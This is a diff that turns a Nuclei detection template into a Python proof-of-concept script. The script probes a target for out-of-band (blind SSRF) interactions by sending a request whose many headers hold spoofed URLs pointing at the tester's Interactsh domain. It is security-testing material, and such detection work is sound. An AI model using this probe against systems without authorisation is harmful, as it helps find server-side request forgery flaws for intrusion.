@@ -1,108 +1,146 @@
-id: oob-header-based-interaction
+import requests  # Import the requests library to handle HTTP requests
+
+import argparse
+
+from colorama import Fore, init
 
 
 
-info:
+# Initialize colorama for colored output
 
-  name: Header Based Generic OOB Interaction
-
-  author: pdteam
-
-  severity: info
-
-  description: The remote server fetched a spoofed URL from the request headers.
-
-  reference:
-
-    - https://github.com/PortSwigger/collaborator-everywhere
-
-  metadata:
-
-    max-request: 1
-
-  tags: oast,ssrf,generic
+init(autoreset=True)
 
 
 
-http:
+def send_oob_request(target_url, interactsh_url):
 
-  - method: GET
+    # Define the headers for the OOB interaction
 
-    path:
+    headers = {
 
-      - "{{BaseURL}}"
+        "User-Agent": f"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@{interactsh_url}",
 
+        "Referer": f"http://{interactsh_url}/ref",
 
+        "Cf-Connecting_ip": f"spoofed.{interactsh_url}",
 
-    headers:
+        "X-Real-Ip": f"spoofed.{interactsh_url}",
 
-      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@{{interactsh-url}}
+        "From": f"root@{interactsh_url}",
 
-      Referer: http://{{interactsh-url}}/ref
+        "True-Client-Ip": f"spoofed.{interactsh_url}",
 
-      Cf-Connecting_ip: spoofed.{{interactsh-url}}
+        "Client-Ip": f"spoofed.{interactsh_url}",
 
-      X-Real-Ip: spoofed.{{interactsh-url}}
+        "Forwarded": f"for=spoofed.{interactsh_url};by=spoofed.{interactsh_url};host=spoofed.{interactsh_url}",
 
-      From: root@{{interactsh-url}}
+        "X-Client-Ip": f"spoofed.{interactsh_url}",
 
-      True-Client-Ip: spoofed.{{interactsh-url}}
+        "X-Originating-Ip": f"spoofed.{interactsh_url}",
 
-      Client-Ip: spoofed.{{interactsh-url}}
+        "X-Wap-Profile": f"http://{interactsh_url}/wap.xml",
 
-      Forwarded: for=spoofed.{{interactsh-url}};by=spoofed.{{interactsh-url}};host=spoofed.{{interactsh-url}}
+        "X-Forwarded-For": f"spoofed.{interactsh_url}",
 
-      X-Client-Ip: spoofed.{{interactsh-url}}
+        "Contact": f"root@{interactsh_url}",
 
-      X-Originating-Ip: spoofed.{{interactsh-url}}
+        "X-Forwarded-Host": f"spoofed.{interactsh_url}",
 
-      X-Wap-Profile: http://{{interactsh-url}}/wap.xml
+        "X-Host": f"spoofed.{interactsh_url}",
 
-      X-Forwarded-For: spoofed.{{interactsh-url}}
+        "X-Forwarded-Server": f"spoofed.{interactsh_url}",
 
-      Contact: root@{{interactsh-url}}
+        "X-HTTP-Host-Override": f"spoofed.{interactsh_url}",
 
-      X-Forwarded-Host: spoofed.{{interactsh-url}}
+        "Profile": f"http://{interactsh_url}/profile.xml",
 
-      X-Host: spoofed.{{interactsh-url}}
+        "Cache-Control": "no-transform"
 
-      X-Forwarded-Server: spoofed.{{interactsh-url}}
-
-      X-HTTP-Host-Override: spoofed.{{interactsh-url}}
-
-      Profile: http://{{interactsh-url}}/profile.xml
-
-      Cache-Control: no-transform
+    }
 
 
 
-    matchers-condition: or
+    try:
 
-    matchers:
+        # Send the HTTP request to the target with the crafted headers
 
-      - type: word
+        print(f"{Fore.YELLOW}[INFO] Sending request to target: {target_url}")
 
-        part: interactsh_protocol
-
-        name: http
-
-        words:
-
-          - "http"
+        response = requests.get(target_url, headers=headers)
 
 
 
-      - type: word
+        # Display the HTTP status code
 
-        part: interactsh_protocol
+        print(f"{Fore.GREEN}[SUCCESS] Received HTTP Status Code: {response.status_code}")
 
-        name: dns
+        
 
-        words:
+        # Get the response content
 
-          - "dns"
+        response_content = response.text
 
 
 
-# digest: 4a0a00473045022100bd3cf08b4348b3c005271dba68fb6b06a15deb5299f2adf45f3013bc27a3a8e502205b6022cd0123b78c69c600889d445b69798da0aff7340952e081a4b542750f12:922c64590222798bb761d5b6d8e72950
+        # Search for the first occurrence of the target URL in the response content
+
+        if target_url in response_content:
+
+            first_occurrence_index = response_content.find(target_url)
+
+            # Show some context around the first occurrence
+
+            preview_start = max(first_occurrence_index - 50, 0)  # 50 characters before the target URL
+
+            preview_end = min(first_occurrence_index + 50, len(response_content))  # 50 characters after the target URL
+
+            
+
+            content_preview = response_content[preview_start:preview_end]
+
+            print(f"{Fore.CYAN}[INFO] First occurrence of '{target_url}' in the response:\n{content_preview}...\n")
+
+        else:
+
+            print(f"{Fore.YELLOW}[INFO] No reference to '{target_url}' found in the response.")
+
+
+
+        # Optionally, print the first 500 characters of the response content for general preview
+
+        print(f"{Fore.CYAN}[INFO] Response content preview:\n{response_content[:500]}...\n")
+
+
+
+    except Exception as e:
+
+        print(f"{Fore.RED}[ERROR] Failed to send request: {e}")
+
+
+
+# Main function to parse arguments and call the request function
+
+def main():
+
+    parser = argparse.ArgumentParser(description="OOB Header-Based Interaction PoC")
+
+    parser.add_argument('target_url', help='The target URL to test (e.g., https://example.com)')
+
+    parser.add_argument('interactsh_url', help='Your Interact.sh domain for OOB testing (e.g., oast.live)')
+
+
+
+    args = parser.parse_args()
+
+
+
+    # Run the OOB request function
+
+    send_oob_request(args.target_url, args.interactsh_url)
+
+
+
+if __name__ == "__main__":
+
+    main()
 
